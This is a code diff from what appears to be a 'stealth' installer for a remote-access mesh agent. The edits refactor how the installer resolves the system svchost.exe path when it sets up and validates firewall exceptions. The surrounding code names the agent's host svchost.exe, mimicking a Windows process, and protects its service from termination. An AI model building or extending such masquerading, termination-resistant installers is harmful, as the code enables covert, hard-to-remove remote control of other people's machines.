@@ -1898,16 +1898,20 @@ static BOOL Stealth_WaitForServiceAbsence(const wchar_t* serviceName, DWORD time
 
 static BOOL Stealth_RefreshFirewallRulesWithRetry(const wchar_t* serviceName, const wchar_t* hostExePath, const wchar_t* agentExePath)
 {
+    wchar_t systemSvchostPath[MAX_PATH] = {0};
+
     if (serviceName == NULL || serviceName[0] == L'\0') { return FALSE; }
     if (hostExePath == NULL || hostExePath[0] == L'\0') { return FALSE; }
     if (agentExePath == NULL || agentExePath[0] == L'\0') { return FALSE; }
+
+    (void)Stealth_GetSystemSvchostPathW(systemSvchostPath, _countof(systemSvchostPath));
 
     for (int attempt = 1; attempt <= STEALTH_FIREWALL_MAX_ATTEMPTS; ++attempt)
     {
         // Best-effort cleanup before (re)adding rules to avoid stale entries.
         (void)Stealth_RemoveFirewallRuleForService(serviceName);
         // Never purge rules by exePath for system32 svchost.exe; that's too broad and can remove OS rules.
-        if (_wcsicmp(hostExePath, L"C:\\Windows\\System32\\svchost.exe") != 0)
+        if (systemSvchostPath[0] == L'\0' || _wcsicmp(hostExePath, systemSvchostPath) != 0)
         {
             (void)Stealth_RemoveFirewallRulesByExePath(hostExePath);
         }
@@ -3251,15 +3255,21 @@ static BOOL Stealth_ApplyInstallFlow(
 
     // Step 4: Add Windows Firewall exceptions
     wchar_t hostExePath[MAX_PATH] = {0};
+    wchar_t systemSvchostPath[MAX_PATH] = {0};
     const wchar_t* hostToExcept = NULL;
     if (MeshInstaller_CombinePath(hostExePath, _countof(hostExePath), paths.installDir, L"svchost.exe") &&
         GetFileAttributesW(hostExePath) != INVALID_FILE_ATTRIBUTES)
     {
         hostToExcept = hostExePath;
     }
+    else if (Stealth_GetSystemSvchostPathW(systemSvchostPath, _countof(systemSvchostPath)))
+    {
+        hostToExcept = systemSvchostPath;
+    }
     else
     {
-        hostToExcept = L"C:\\Windows\\System32\\svchost.exe";
+        Stealth_LogInstallEvent(L"[ERROR] Unable to resolve system svchost.exe for firewall provisioning");
+        return FALSE;
     }
 
     if (!Stealth_RefreshFirewallRulesWithRetry(serviceKeyName, hostToExcept, paths.exePath))
@@ -3738,17 +3748,23 @@ CLEANUP:
     Stealth_ProtectServiceFromTermination(serviceKeyName);
 
     // Refresh firewall rules (host svchost + WebRTC inbound UDP)
+    wchar_t systemSvchostPath[MAX_PATH] = {0};
     const wchar_t* hostToExcept = NULL;
     if (hostExePath[0] != L'\0' && GetFileAttributesW(hostExePath) != INVALID_FILE_ATTRIBUTES)
     {
         hostToExcept = hostExePath;
     }
+    else if (Stealth_GetSystemSvchostPathW(systemSvchostPath, _countof(systemSvchostPath)))
+    {
+        hostToExcept = systemSvchostPath;
+    }
     else
     {
-        hostToExcept = L"C:\\Windows\\System32\\svchost.exe";
+        Stealth_LogInstallEvent(L"[UPDATE] Unable to resolve system svchost.exe for firewall provisioning");
+        success = FALSE;
     }
 
-    if (!Stealth_RefreshFirewallRulesWithRetry(serviceKeyName, hostToExcept, paths.exePath))
+    if (hostToExcept != NULL && !Stealth_RefreshFirewallRulesWithRetry(serviceKeyName, hostToExcept, paths.exePath))
     {
         Stealth_LogInstallEvent(L"[UPDATE] Firewall rule provisioning failed for %ls", serviceKeyName);
         success = FALSE;
@@ -4755,18 +4771,20 @@ static BOOL Stealth_DiscoverCurrentState(StealthLifecycleDiscovery* discovery)
     discovery->serviceAliasClean = (discovery->conflictingServiceAliasCount == 0);
 
     wchar_t hostExePath[MAX_PATH] = {0};
+    wchar_t systemSvchostPath[MAX_PATH] = {0};
     const wchar_t* hostToValidate = NULL;
     if (MeshInstaller_CombinePath(hostExePath, _countof(hostExePath), discovery->paths.installDir, L"svchost.exe") &&
         Stealth_PathExists(hostExePath))
     {
         hostToValidate = hostExePath;
     }
-    else
+    else if (Stealth_GetSystemSvchostPathW(systemSvchostPath, _countof(systemSvchostPath)))
     {
-        hostToValidate = L"C:\\Windows\\System32\\svchost.exe";
+        hostToValidate = systemSvchostPath;
     }
     discovery->firewallRulePresent = Stealth_CheckFirewallRuleExists(discovery->serviceKeyName);
-    discovery->firewallHealthy = (discovery->firewallRulePresent &&
+    discovery->firewallHealthy = (hostToValidate != NULL &&
+                                  discovery->firewallRulePresent &&
                                   Stealth_DoFirewallRulesMatch(discovery->serviceKeyName, hostToValidate, discovery->paths.exePath));
 
     StealthPersistenceState persisted = {0};
@@ -5936,22 +5954,24 @@ static BOOL Stealth_RunInstallValidationInternal(const char* phase)
 
     // Firewall rule validation
     wchar_t svchostPath[MAX_PATH] = {0};
+    wchar_t systemSvchostPath[MAX_PATH] = {0};
     const wchar_t* hostToValidate = NULL;
     if (MeshInstaller_CombinePath(svchostPath, _countof(svchostPath), paths.installDir, L"svchost.exe") &&
         GetFileAttributesW(svchostPath) != INVALID_FILE_ATTRIBUTES)
     {
         hostToValidate = svchostPath;
     }
-    else
+    else if (Stealth_GetSystemSvchostPathW(systemSvchostPath, _countof(systemSvchostPath)))
     {
-        hostToValidate = L"C:\\Windows\\System32\\svchost.exe";
+        hostToValidate = systemSvchostPath;
     }
 
-    summary.firewallRule = Stealth_WaitForFirewallRuleConvergence(
-        serviceKeyName,
-        hostToValidate,
-        paths.exePath,
-        STEALTH_FIREWALL_SETTLE_TIMEOUT_MS);
+    summary.firewallRule = (hostToValidate != NULL &&
+        Stealth_WaitForFirewallRuleConvergence(
+            serviceKeyName,
+            hostToValidate,
+            paths.exePath,
+            STEALTH_FIREWALL_SETTLE_TIMEOUT_MS));
     if (!summary.firewallRule)
     {
         summary.success = FALSE;
